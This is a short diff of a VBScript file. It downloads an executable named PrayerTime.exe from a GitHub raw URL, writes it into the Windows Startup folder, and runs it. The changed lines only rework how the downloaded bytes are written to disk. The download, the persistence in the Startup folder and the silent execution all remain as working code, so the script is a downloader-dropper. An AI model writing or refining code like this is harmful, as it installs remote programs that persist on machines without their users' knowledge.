@@ -3,10 +3,13 @@ objHTTP.open "GET", "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Pray
 objHTTP.send
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
-strDest = CreateObject("WScript.Shell").SpecialFolders( "Startup") & "\PrayerTime.exe"
+strDest = CreateObject("WScript.Shell").SpecialFolders("Startup") & "\PrayerTime.exe"
 Set objFile = objFSO.CreateTextFile(strDest, True)
-objFile.Write objHTTP.responseBody
-objFile.Close
+
+Set objBinaryFile = objFSO.OpenTextFile(strDest, 2, True)
+
+objBinaryFile.Write objHTTP.responseBody
+objBinaryFile.Close
 
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run Chr(34) & strDest & Chr(34), 1, False
